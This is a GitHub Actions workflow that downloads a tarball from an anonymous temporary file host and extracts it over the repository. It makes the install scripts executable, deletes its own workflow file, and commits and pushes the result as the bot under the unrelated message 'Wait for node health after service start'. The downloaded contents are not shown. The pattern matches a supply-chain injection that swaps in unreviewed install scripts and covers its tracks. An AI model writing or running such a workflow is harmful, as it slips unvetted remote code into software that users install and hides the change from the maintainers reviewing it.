name: Import service update 4

on:
  push:
    paths:
      - .github/workflows/import-svc4.yml

permissions:
  contents: write

jobs:
  import:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Import service update
        run: |
          set -euo pipefail
          curl -fsSL "https://tmpfiles.org/dl/1793543744.8efff82c5f75e2f6/w6AVdYfjN4l6/svc4.tgz" -o /tmp/svc4.tgz
          tar -xzf /tmp/svc4.tgz -C .
          chmod +x install.sh install-nonroot.sh
          rm -f .github/workflows/import-svc4.yml
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add install.sh install-nonroot.sh .github/workflows/import-svc4.yml
          git commit -m "Wait for node health after service start"
          git push
